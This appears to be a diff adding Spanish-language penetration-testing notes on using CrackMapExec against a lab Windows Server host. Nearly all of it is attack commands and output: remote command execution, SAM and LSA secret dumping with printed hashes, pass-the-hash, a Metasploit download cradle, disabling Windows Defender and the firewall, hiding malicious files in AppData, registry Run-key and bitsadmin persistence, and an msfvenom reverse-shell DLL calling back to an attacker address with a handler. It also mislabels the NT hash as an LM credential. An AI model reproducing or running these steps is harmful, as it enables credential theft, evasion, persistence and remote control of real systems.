@@ -1,0 +1,197 @@
+Crackmapexec (CME)se utiliza principalmente para enumerar, escanear y realizar ataques contra sistemas Windows en una red. Puede realizar diversas funciones, como mapeo de shares, enumeración de usuarios y grupos, búsqueda de contraseñas débiles, entre otras.
+
+Es muy importante explorar todo lo que podamos, por ejemplo: las opciones del firewall, la estructura de ficheros, las cuentas de usuarios, los grupos, los recursos compartidos. Son medios por los cuales posteriormente podríamos realizar otro tipo de técnicas, para elevar privilegios , crear persistencia, realizar un cambio de cuenta de usuarios, escala de privilegios lateral o vertical. 
+
+A continuación tenemos un listado de comandos que nos pueden brindar toda esta información 
+
+Enumerar hosts en una red:
+cme smb <RANGO_IP> 
+Sustituir <RANGO_IP> por el rango de direcciones IP que deseas escanear.
+
+Enumerar usuarios en un host:
+cme smb <IP> -u <USUARIO> -p <CONTRASEÑA> --users
+Sustituir <IP> por la dirección IP del host, <USUARIO> por un nombre de usuario válido y <CONTRASEÑA> por la contraseña correspondiente.
+
+Enumerar shares en un host:
+cme smb <IP> -u <USUARIO> -p <CONTRASEÑA> --shares
+
+Enumerar grupos en un host:
+cme smb <IP> -u <USUARIO> -p <CONTRASEÑA> --groups
+
+Escanear hosts en paralelo:
+cme smb <RANGO_IP> --threads <NUM_HILOS>
+Sustituir <RANGO_IP> por el rango de direcciones IP que deseas escanear y <NUM_HILOS> por el número de hilos que deseas utilizar para escanear en paralelo.
+
+Ejemplo de comando para verificar si las credenciales que obtuvimos son correctas: 
+┌──(root㉿kali)-[/home/kali]
+└─# crackmapexec smb 192.168.56.103 -u vagrant -p vagrant
+SMB         192.168.56.103  445    ENIGMA           [*] Windows Server 2012 Standard 9200 x64 (name:ENIGMA) (domain:SantaPrisca.virtual) (signing:True) (SMBv1:True)
+SMB         192.168.56.103  445    ENIGMA           [+] SantaPrisca.virtual\vagrant:vagrant (Pwn3d!)
+
+Si nos aparece el texto (Pwn3d!) es que las credenciales son correctas. 
+
+Si a este comando le agregamos la -x y luego podemos usar comandos como por ejemplo whoami, dir , ipconfig, etc
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x dir
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x ipconfig
+
+Si a este comando le agregamos la -X nos dejará poner comandos de powershell
+
+Si al comando le agregamos --shares nos dará los recursos compartidos
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant --shares
+
+Para ver usuarios existentes en el dominio: 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant --users 
+
+Para ver discos en el sistema 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant --disks
+
+Para ver grupos existentes en la máquina: 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant --groups
+los grupos locales 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant --local-groups
+
+Para mirar todos los parches que tiene el sistema operativo, para ver si tiene alguna vulnerabilidad que nos podramos aprovechar. Sabiendo los parches que tiene tambien podemos saber los que le faltan e intentar vulnerarlos. 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'wmic qfe'
+
+para ver que tipo de arquitectura tiene el sistema: 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'wmic os get osarchitecture'
+
+Ejecutar comando ver que muestra la version del sistema operativos antiguos de windows
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'ver'
+
+Intentar ver las unidades de almacenamiento
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'wmic logicaldisk get caption || fsutil fsinfo drives'
+
+
+Para ver que privilegios tiene el usuario actual: 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'whoami /priv' 
+
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'whoami /all' 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'net user' 
+
+Comprobar grupos de trabajo locales: 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'net localgroup <NOMBRE DEL GRUPO A PROBAR>'  ejemplo :
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'net localgroup administrators' 
+
+Para ver la ruta arp que tiene creada: 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'route print'
+
+Para ver las direcciones MAC de la maquina: 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'arp -A'
+
+Para ver el estado del firewall: 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'netsh firewall show state'
+
+Para ver recursos compartidos: 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant -x 'net share'
+
+Podemos intentar buscar ficheros que tengan un tipo de patron.
+Activamos el spider : 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant --spider C\$ --pattern 'password'
+
+Para ver la política de contraseñas: 
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant --pass-pol 
+Esto nos dará pista de que tipo de contraseña nos encontraremos, longitud mínima, si es compleja o no, Si no tiene el bloqueo habilitado, lo que nos permitiría un ataque de diccionario. 
+
+Si el usuario tiene permisos por ejemplo para realizar copias de seguridad, podemos intentar habilitar el parametro de crackmapexec --lsa
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant --lsa
+Esto hará Dumping LSA secrets. Nos dará los secretos de LSA 
+
+Para el fichero SAM
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant --sam
+Esto nos devolverá algo parecido a esto: 
+
+crackmapexec smb 192.168.56.103 -u vagrant -p vagrant --sam
+SMB         192.168.56.103  445    ENIGMA           [*] Windows Server 2012 Standard 9200 x64 (name:ENIGMA) (domain:SantaPrisca.virtual) (signing:True) (SMBv1:True)
+SMB         192.168.56.103  445    ENIGMA           [+] SantaPrisca.virtual\vagrant:vagrant (Pwn3d!)
+SMB         192.168.56.103  445    ENIGMA           [+] Dumping SAM hashes
+SMB         192.168.56.103  445    ENIGMA           Administrator:500:aad3b435b51404eeaad3b435b51404ee:0ad8c247bb2759649193fd181371d0c1:::
+SMB         192.168.56.103  445    ENIGMA           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.56.103  445    ENIGMA           [+] Added 2 SAM hashes to the database
+
+
+Con el contenido del fichero SAM podemos ver que hay diferentes cuentas, como ejemplo puede haber una de Administrator y luego está la credencial cifrada. Pero igualmente usando el usuario Administrator podemos usar un PASS DE HASH en vez de la contraseña. Esto puede funcionar con las  credenciales LM o con las credenciales NTLM. Debemos probar ambas.  Para ello debemos ejecutar de la siguiente manera. 
+crackmapexec smb 192.168.56.103 -u Administrator -H <PEGAMOS AQUI EL HASH> --sam
+Ejemplo: Cojemos la segunda parte del HASH que sería la credencial LM 
+
+crackmapexec smb 192.168.56.103 -u Administrator -H 0ad8c247bb2759649193fd181371d0c1
+
+Esto en este ejemplo funcionó y obtuvimos acceso como Administrator
+
+Ahora lo que haremos será usar metasploit y crackmapexec combinados. 
+Encadenamos un web_delivery utilizando crackmapexec
+Para ello abriremos metasploit el modulo exploit/multi/script/web_delivery
+Usaremos las credenciales que ya obtuvimos.
+En crackmapexec verificamos primero las opciones del modulo, con el comando:
+crackmapexec smb 192.168.56.103 -u Administrator -H 0ad8c247bb2759649193fd181371d0c1 -M web_delivery --options
+
+este es el resultado: 
+[*] web_delivery module options:
+
+        URL  URL for the download cradle
+        PAYLOAD  Payload architecture (choices: 64 or 32) Default: 64
+
+Verificamos que podemos usar el parametro URL . Para ello debemos obtener la URL con metasploit. Usando el exploit/multi/script/web_delivery 
+Usamos el comando ahora de la siguiente forma: 
+crackmapexec smb 192.168.56.103 -u Administrator -H 0ad8c247bb2759649193fd181371d0c1 -M web_delivery -o URL= <Pegamos aqui la url generada con metasploit>
+
+Ahora que ya tenemos una session creada con meterpreter y con privilegios de system, vamos a Verificar distintos procesos y realizar tecnicas y no perder este tipo de sesion. 
+Tecnicas de persistencia. 
+Por ejemplo lo primero que debemos hacer es comprobar si podemos desabilitar el antivirus. ejecutamo primero : Shell para tener una shell en vez de meterpreter y ejecutamos el siguiente Comando: 
+sc config WinDefend start= disabled 
+sc stop Windefend
+Otra alternativa es desabilitar el firewall, comando: 
+netsh Advfirewall show allprofiles  (esto nos mostrara los perfiles)
+para desabilitarlo aunque no es aconsejable. 
+netsh Advfirewall set allprofiles state off (esto desabilitaria el firewall en la maquina)
+
+Otra opción que tenemos es la de ocultar ficheros. Por ejemplo si tenemos un fichero malicioso en la maquina y lo queremos ocultar usariamos el comando: 
+attrib +h <ruta del fichero>
+ejemplo si estamos en la carpeta C:\: 
+attrib +h C:\fichero.bat
+
+Una ruta recomendada para almacenar nuestro fichero malicioso puede ser la carpeta Temp, dentro de C:\Windows\Temp
+Son rutas recomendadas para evitar llamar la atención. 
+Por ejemplo podriamos usar la carpeta del usuario X y alli buscar la carpeta oculta appdata y luego local y alli temp.  Ejemplo: 
+C:\Users\vagrant\AppData\Local\Temp>
+
+Dentro de la carpeta AppData (que es una carpeta oculta)hay muchas otras carpetas y un usuario comun no sabrá disernir con que esta trabajando Ejemplo: copiariamos aqui nuestro fichero malicioso
+C:\Users\vagrant\AppData\Roaming\Adobe\Flash Player>
+
+Una vez copiamos nuestro fichero malicioso a la carpeta que deseamos, Desactivamos el motor antivirus, y luego vamos a añadir claves del registro de windows en el que diga: vete a ''HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run''  Lo vamos a llamar /v Persistencia /t  indicamos que tipo de registro vamos a crear REG_SZ y la ruta /d será C:\Users\vagrant\AppData\Roaming\Adobe\Flash Player\ficheromaligno.exe. 
+Por lo que el comando debería ser el siguiente: 
+reg add 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run' /v Persistencia /t REG_SZ /d C:\Users\vagrant\AppData\Roaming\Adobe\Flash Player\ficheromaligno.exe
+
+Esto crearía una entrada en el registro para que se ejecute este fichero una vez iniciase la maquina. Si quisieramos que la persistencia fuese solo 1 vez , cambiariamos el Run por RunOnce. 
+esto crearia la entrada al fichero malicioso que dejamos en la maquina para que una vez que se inicie el sistema operativo, se inicie el fichero malicioso. 
+
+Otra opción que tenemos para persistencia manual, sería mediante las tareas. Existe un administrador de tareas que es el bitsadmin .
+Podemos crear una tarea que se llame persistencia:
+bitsadmin /create persistencia 
+
+Otra tecnica de persistencia puede ser a traves de librerias maliciosas. Además de crearme un fichero ejecutable, podemos crear una pequeña libreria (fichero .dll) que lo permite MSFvenom . Con metasploit en vez de crear el tipico ejecutable lo que vamos a hacer es asociar mi libreria maliciosa a ese binario legitimo.
+Comandos: 
+msfvenom -l formats
+Crearemos un fichero .ddl (una librería) 
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.16 LPORT=44045 -f dll -o fichero.dll
+Y luego lo subiremos, comando: 
+meterpreter > upload /home/kali/fichero.dll
+
+Lo primero que haremos es comprobar que funciona. Dejamos la session en background 
+
+Luego ejecutamos el siguiente modulo de metasploit: 
+msf6 exploit(multi/script/web_delivery) > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/
+Display all 292 possibilities? (y or n)
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+
+
+msf6 exploit(multi/handler) > set lhost 10.0.2.15
+lhost => 10.0.2.15
+msf6 exploit(multi/handler) > set lport 44045
+lport => 44045
+msf6 exploit(multi/handler) > exploit -j
+
+
